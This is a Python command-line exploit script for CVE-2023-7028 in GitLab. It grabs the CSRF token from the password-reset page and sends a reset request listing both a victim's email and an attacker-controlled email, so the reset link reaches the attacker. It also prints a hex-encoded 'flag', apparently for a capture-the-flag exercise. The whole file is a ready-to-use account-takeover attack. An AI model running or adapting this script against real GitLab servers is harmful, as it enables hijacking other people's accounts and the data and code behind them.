import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        """
        Initialize the exploit class.
        :param url: Target GitLab URL.
        :param target: Target email for password reset.
        :param evil: Optional attacker-controlled email.
        """
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        """
        Fetch the CSRF token required for the password reset request.
        :return: CSRF token as a string, or None if fetching fails.
        """
        try:
            print('[DEBUG] Getting authenticity_token ...')
            # Request the password reset page
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            # Extract the CSRF token using regex
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        """
        Send the password reset request with both target and attacker emails.
        :return: True if the request is successfully sent, otherwise False.
        """
        token = self.get_csrf_token()
        if not token:
            return False

        # Construct query parameters for the POST request
        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        # Set request headers
        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        # Send the POST request to trigger password reset
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        
        # Check if the request was successful by looking for confirmation text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            # Decode a hidden flag message
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

# Argument parsing function
def parse_args():
    """
    Parse command-line arguments.
    :return: Parsed arguments.
    """
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on GitLab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="GitLab URL")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

# Entry point for script execution
if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
        evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
